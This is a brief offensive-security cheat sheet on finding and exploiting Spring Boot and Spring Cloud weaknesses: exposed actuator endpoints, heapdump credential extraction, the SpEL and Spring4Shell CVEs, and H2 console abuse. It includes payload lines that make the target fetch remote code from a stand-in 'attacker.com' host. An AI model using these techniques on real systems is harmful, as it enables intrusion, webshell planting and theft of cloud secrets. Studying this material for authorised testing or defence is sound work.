# Spring Boot & Spring Cloud Hunting Reference

## Attack Surface Signals
- Favicon hash: `116323821` (Whitelabel Error Page).
- Default error JSON: `{"timestamp": ..., "status": 404, "error": "Not Found", "path": "..."}`.
- Actuator endpoints: `/actuator`, `/actuator/env`, `/actuator/heapdump`, `/actuator/health`, `/actuator/gateway`.

## Core Exploitation Techniques
1. **Actuator Endpoint Exposure**:
   - `/actuator/heapdump`: Download memory dump and extract plaintext credentials/tokens using `jhat` or `strings`.
   - `/actuator/env`: Extract environment variables, database passwords, cloud keys.
2. **Writable `/env` + `/refresh` RCE Gadgets**:
   - POST to `/actuator/env` with `spring.cloud.bootstrap.location=http://attacker.com/evil.yml` followed by POST to `/actuator/refresh`.
3. **Spring Cloud Gateway SpEL Injection (CVE-2022-22947)**:
   - POST to `/actuator/gateway/routes/hack` with SpEL expression in filter args triggering instant RCE.
4. **Spring4Shell (CVE-2022-22965)**:
   - Parameter binding flaw on Tomcat: `class.module.classLoader.resources.context.parent.pipeline.first.pattern=...` to drop webshell.
5. **H2 Database Console Exposure**:
   - Access `/h2-console` and connect to malicious JNDI / JDBC URL: `jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.com/evil.sql'`.

## Exploit Chains
- **Actuator Heapdump → Cloud Secret Exfiltration → Infrastructure Takeover**.
- **Actuator Route Injection (SpEL) → Remote Code Execution**.
